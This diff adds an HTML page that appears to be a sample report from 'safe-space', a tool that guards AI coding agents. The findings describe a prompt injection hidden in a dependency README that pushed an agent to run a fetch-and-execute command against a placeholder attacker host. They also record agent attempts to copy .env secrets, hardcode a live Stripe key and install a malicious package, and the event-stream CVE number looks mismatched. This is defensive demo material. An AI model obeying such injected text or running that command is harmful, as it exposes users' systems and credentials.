@@ -1,0 +1,232 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Security Scan Report — Safe Space</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    html {
+      font-family: 'SF Mono', 'Fira Code', ui-monospace, monospace;
+      background: #0f0f0f; color: #d4d4d4; line-height: 1.6; font-size: 14px;
+    }
+    body { max-width: 800px; margin: 0 auto; padding: 32px 24px; }
+    .header { border-bottom: 1px solid #333; padding-bottom: 16px; margin-bottom: 24px; }
+    .logo { color: #4ade80; font-weight: 700; font-size: 1.1rem; }
+    .timestamp { color: #737373; font-size: 0.85rem; margin-top: 4px; }
+    h1 { font-size: 1.3rem; color: #fff; margin-bottom: 4px; }
+    h2 { font-size: 1rem; color: #a3a3a3; margin-top: 32px; margin-bottom: 12px; text-transform: uppercase; letter-spacing: 0.1em; }
+    .summary { display: grid; grid-template-columns: repeat(4, 1fr); gap: 12px; margin: 24px 0; }
+    .summary-card { background: #1a1a1a; border: 1px solid #333; border-radius: 6px; padding: 16px; text-align: center; }
+    .summary-card .value { font-size: 2rem; font-weight: 700; }
+    .summary-card .label { font-size: 0.75rem; color: #737373; text-transform: uppercase; letter-spacing: 0.05em; margin-top: 4px; }
+    .critical .value { color: #ef4444; }
+    .warning .value { color: #f59e0b; }
+    .info .value { color: #3b82f6; }
+    .safe .value { color: #4ade80; }
+    .finding { background: #1a1a1a; border: 1px solid #333; border-radius: 6px; padding: 16px; margin-bottom: 12px; }
+    .finding-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px; }
+    .finding-title { color: #fff; font-weight: 600; }
+    .severity { padding: 2px 8px; border-radius: 3px; font-size: 0.75rem; font-weight: 600; text-transform: uppercase; }
+    .severity.critical { background: #450a0a; color: #ef4444; border: 1px solid #7f1d1d; }
+    .severity.high { background: #451a03; color: #f59e0b; border: 1px solid #78350f; }
+    .severity.medium { background: #172554; color: #60a5fa; border: 1px solid #1e3a5f; }
+    .severity.low { background: #052e16; color: #4ade80; border: 1px solid #14532d; }
+    .finding p { color: #a3a3a3; margin-bottom: 8px; font-size: 0.9rem; }
+    .finding code { background: #0a0a0a; padding: 2px 6px; border-radius: 3px; color: #fbbf24; font-size: 0.85rem; }
+    .finding .location { color: #737373; font-size: 0.8rem; }
+    .blocked { display: inline-block; background: #052e16; color: #4ade80; padding: 1px 6px; border-radius: 3px; font-size: 0.75rem; margin-left: 8px; }
+    .timeline { margin: 24px 0; }
+    .timeline-entry { display: flex; gap: 12px; padding: 6px 0; border-bottom: 1px solid #1a1a1a; font-size: 0.85rem; }
+    .timeline-time { color: #737373; min-width: 80px; }
+    .timeline-event { color: #d4d4d4; }
+    .timeline-event .action-block { color: #ef4444; }
+    .timeline-event .action-allow { color: #4ade80; }
+    .timeline-event .action-warn { color: #f59e0b; }
+    .footer { margin-top: 32px; padding-top: 16px; border-top: 1px solid #333; color: #525252; font-size: 0.8rem; }
+    .footer a { color: #4ade80; text-decoration: none; }
+    @media (max-width: 600px) { .summary { grid-template-columns: repeat(2, 1fr); } }
+  </style>
+</head>
+<body>
+
+<div class="header">
+  <div class="logo">safe-space scan report</div>
+  <h1>Project: acme-dashboard</h1>
+  <div class="timestamp">Scan completed: Feb 21, 2026 at 14:32 UTC &middot; Duration: 4.2s &middot; Sessions analyzed: 3</div>
+</div>
+
+<div class="summary">
+  <div class="summary-card critical">
+    <div class="value">2</div>
+    <div class="label">Critical</div>
+  </div>
+  <div class="summary-card warning">
+    <div class="value">5</div>
+    <div class="label">Warnings</div>
+  </div>
+  <div class="summary-card info">
+    <div class="value">8</div>
+    <div class="label">Info</div>
+  </div>
+  <div class="summary-card safe">
+    <div class="value">3</div>
+    <div class="label">Blocked</div>
+  </div>
+</div>
+
+<h2>Critical Findings</h2>
+
+<div class="finding">
+  <div class="finding-header">
+    <span class="finding-title">Prompt Injection Detected in Dependency</span>
+    <span class="severity critical">critical</span>
+  </div>
+  <p>
+    AI agent attempted to execute a command embedded in a dependency's README.md file.
+    The injected instruction tried to override the agent's system prompt and execute
+    <code>curl -s https://evil.example/collect | sh</code>.
+  </p>
+  <p>
+    <span class="blocked">BLOCKED by hook guard</span>
+  </p>
+  <div class="location">Source: node_modules/fancy-utils/README.md:47 &middot; Session: claude-2026-02-21T13-12</div>
+</div>
+
+<div class="finding">
+  <div class="finding-header">
+    <span class="finding-title">Credential Exfiltration Attempt</span>
+    <span class="severity critical">critical</span>
+  </div>
+  <p>
+    AI agent read <code>.env</code> file containing <code>DATABASE_URL</code> and
+    <code>STRIPE_SECRET_KEY</code>, then attempted to write contents to a new file
+    in <code>/tmp/</code>. The write was intercepted before execution.
+  </p>
+  <p>
+    <span class="blocked">BLOCKED by hook guard</span>
+  </p>
+  <div class="location">Source: .env &middot; Session: claude-2026-02-21T14-05</div>
+</div>
+
+<h2>Warnings</h2>
+
+<div class="finding">
+  <div class="finding-header">
+    <span class="finding-title">Suspicious Network Request in Generated Code</span>
+    <span class="severity high">high</span>
+  </div>
+  <p>
+    Generated code in <code>src/utils/analytics.ts</code> contains a fetch call to
+    an external URL not present in the project's known API endpoints.
+    Target: <code>https://cdn-analytics.example.com/t.js</code>
+  </p>
+  <div class="location">Source: src/utils/analytics.ts:23 &middot; Session: claude-2026-02-21T13-12</div>
+</div>
+
+<div class="finding">
+  <div class="finding-header">
+    <span class="finding-title">Broad File System Access Pattern</span>
+    <span class="severity high">high</span>
+  </div>
+  <p>
+    AI agent accessed 47 files outside the project's <code>src/</code> directory in a single session,
+    including <code>~/.ssh/config</code>, <code>~/.gitconfig</code>, and <code>~/.zshrc</code>.
+    While individually these may be benign, the pattern warrants review.
+  </p>
+  <div class="location">Session: claude-2026-02-21T14-05 &middot; Files accessed: 47</div>
+</div>
+
+<div class="finding">
+  <div class="finding-header">
+    <span class="finding-title">Hardcoded API Key in Generated Code</span>
+    <span class="severity high">high</span>
+  </div>
+  <p>
+    AI agent wrote a hardcoded API key in <code>src/config/stripe.ts:8</code>.
+    The key starts with <code>sk_live_</code> and appears to be a production Stripe key.
+    This should be moved to environment variables.
+  </p>
+  <div class="location">Source: src/config/stripe.ts:8 &middot; Session: claude-2026-02-21T13-45</div>
+</div>
+
+<div class="finding">
+  <div class="finding-header">
+    <span class="finding-title">Insecure Dependency Installed</span>
+    <span class="severity medium">medium</span>
+  </div>
+  <p>
+    AI agent ran <code>npm install event-stream@3.3.6</code>, a package version
+    known to contain a supply chain attack (CVE-2018-16396).
+  </p>
+  <p>
+    <span class="blocked">BLOCKED by hook guard</span>
+  </p>
+  <div class="location">Session: claude-2026-02-21T14-05</div>
+</div>
+
+<div class="finding">
+  <div class="finding-header">
+    <span class="finding-title">Overly Permissive File Permissions</span>
+    <span class="severity medium">medium</span>
+  </div>
+  <p>
+    Generated deployment script sets <code>chmod 777</code> on the application directory.
+    Recommend using <code>chmod 755</code> instead.
+  </p>
+  <div class="location">Source: scripts/deploy.sh:12 &middot; Session: claude-2026-02-21T13-45</div>
+</div>
+
+<h2>Hook Guard Timeline</h2>
+
+<div class="timeline">
+  <div class="timeline-entry">
+    <span class="timeline-time">13:12:04</span>
+    <span class="timeline-event"><span class="action-allow">ALLOW</span> read src/components/Dashboard.tsx</span>
+  </div>
+  <div class="timeline-entry">
+    <span class="timeline-time">13:12:07</span>
+    <span class="timeline-event"><span class="action-allow">ALLOW</span> write src/components/Dashboard.tsx</span>
+  </div>
+  <div class="timeline-entry">
+    <span class="timeline-time">13:12:11</span>
+    <span class="timeline-event"><span class="action-warn">WARN</span> read node_modules/fancy-utils/README.md (contains prompt injection pattern)</span>
+  </div>
+  <div class="timeline-entry">
+    <span class="timeline-time">13:12:12</span>
+    <span class="timeline-event"><span class="action-block">BLOCK</span> bash: curl -s https://evil.example/collect | sh</span>
+  </div>
+  <div class="timeline-entry">
+    <span class="timeline-time">13:45:22</span>
+    <span class="timeline-event"><span class="action-allow">ALLOW</span> write src/config/stripe.ts</span>
+  </div>
+  <div class="timeline-entry">
+    <span class="timeline-time">13:45:23</span>
+    <span class="timeline-event"><span class="action-warn">WARN</span> hardcoded secret detected in write payload</span>
+  </div>
+  <div class="timeline-entry">
+    <span class="timeline-time">14:05:01</span>
+    <span class="timeline-event"><span class="action-allow">ALLOW</span> read .env</span>
+  </div>
+  <div class="timeline-entry">
+    <span class="timeline-time">14:05:02</span>
+    <span class="timeline-event"><span class="action-block">BLOCK</span> write /tmp/.env_backup (credential exfiltration)</span>
+  </div>
+  <div class="timeline-entry">
+    <span class="timeline-time">14:05:15</span>
+    <span class="timeline-event"><span class="action-block">BLOCK</span> bash: npm install event-stream@3.3.6 (known malicious version)</span>
+  </div>
+  <div class="timeline-entry">
+    <span class="timeline-time">14:05:33</span>
+    <span class="timeline-event"><span class="action-allow">ALLOW</span> bash: npm install event-stream@4.0.1</span>
+  </div>
+</div>
+
+<div class="footer">
+  <p>Generated by <a href="https://github.com/Chill-AI-Space/safe-space">safe-space</a> v1.2.0</p>
+  <p>Run <code>npx safe-space scan</code> to generate your own report.</p>
+  <p><a href="https://chillai-website.pages.dev">chill.ai</a> &mdash; your safe space for vibe coding</p>
+</div>
+
+</body>
+</html>
